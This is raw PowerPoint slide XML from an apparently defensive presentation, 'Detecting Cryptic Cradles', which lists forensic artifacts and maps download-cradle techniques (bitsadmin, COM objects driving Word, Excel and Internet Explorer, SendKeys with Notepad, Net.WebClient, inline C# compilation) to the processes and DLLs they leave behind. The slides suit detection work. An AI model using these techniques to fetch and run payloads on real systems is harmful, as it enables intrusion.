            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Registry keys of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Cached temporary files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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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171765" y="2277001"/>
            <a:ext cx="4182035" cy="3323987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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 smtClean="0"/>
              <a:t>bitsadmin.exe/Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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 smtClean="0"/>
              <a:t>svchost.exe</a:t>
            </a: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/>
              <a:t>COM Object + Word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winword.exe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/>
              <a:t>COM Object + Excel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 smtClean="0"/>
              <a:t>excel.exe</a:t>
            </a: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/>
              <a:t>COM Object + Internet Explorer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 smtClean="0"/>
              <a:t>iexplore.exe</a:t>
            </a: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 err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> + Notepad</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>notepad.exe &amp; svchost.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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363953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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Registry keys of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Cached temporary files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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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2172" y="1403059"/>
            <a:ext cx="5890773" cy="464930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171765" y="2277001"/>
            <a:ext cx="4182035" cy="3323987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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 smtClean="0"/>
              <a:t>bitsadmin.exe/Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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 smtClean="0"/>
              <a:t>svchost.exe</a:t>
            </a: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/>
              <a:t>COM Object + Word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winword.exe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/>
              <a:t>COM Object + Excel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 smtClean="0"/>
              <a:t>excel.exe</a:t>
            </a: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/>
              <a:t>COM Object + Internet Explorer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 smtClean="0"/>
              <a:t>iexplore.exe</a:t>
            </a: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 err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> + Notepad</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>notepad.exe &amp; svchost.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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243764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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Registry keys of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Cached temporary files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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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902824" y="2082045"/>
            <a:ext cx="4639235" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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/>
              <a:t>bitsadmin.exe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powershell.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> bitsadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>.exe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/>
              <a:t>COM Object + Word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svchost.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>winword.exe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/>
              <a:t>COM Object + Excel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svchost.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>excel.exe</a:t>
            </a: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/>
              <a:t>COM Object + Internet Explorer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svchost.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>iexplore.exe</a:t>
            </a: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 err="1"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> + Notepad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 smtClean="0"/>
              <a:t>powershell.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>notepad</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.exe</a:t>
            </a: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 smtClean="0"/>
              <a:t>Inline Scripting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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powershell.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>csc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.exe &amp; vbc.exe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4591786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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>logs (besides all PS logs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Registry keys of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Cached temporary files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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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9335" y="1380565"/>
            <a:ext cx="5469585" cy="318178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4776" y="4686254"/>
            <a:ext cx="6925233" cy="1383004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2192014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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Registry keys </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Cached temporary files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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279341" y="1533578"/>
            <a:ext cx="4074459" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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 smtClean="0"/>
              <a:t>COM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Object + Internet Explorer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 smtClean="0"/>
              <a:t>ieproxy.dll</a:t>
            </a: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 err="1"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Notepad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 smtClean="0"/>
              <a:t>winhttp.dll &amp; wininet.dll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 smtClean="0"/>
              <a:t>PowerShell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rasman.dll &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rasapi32.dll</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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9721" y="3716948"/>
            <a:ext cx="6544079" cy="2335415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9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5876260" y="2087575"/>
            <a:ext cx="1261732" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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b="1" dirty="0" smtClean="0"/>
              <a:t>RASMAN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>emote </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Connection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Man</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ager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49218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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Registry keys </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Cached temporary files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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279341" y="1533578"/>
            <a:ext cx="4074459" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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 smtClean="0"/>
              <a:t>COM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Object + Internet Explorer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 smtClean="0"/>
              <a:t>ieproxy.dll</a:t>
            </a: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 err="1"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Notepad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 smtClean="0"/>
              <a:t>winhttp.dll &amp; wininet.dll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 smtClean="0"/>
              <a:t>PowerShell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rasman.dll &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rasapi32.dll</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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9721" y="3716948"/>
            <a:ext cx="6544079" cy="2335415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29359" y="1496402"/>
            <a:ext cx="5724441" cy="361030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5714983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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Registry keys </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Cached temporary files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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373906" y="3132862"/>
            <a:ext cx="4979894" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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/>
              <a:t>Inline </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Scripting (e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
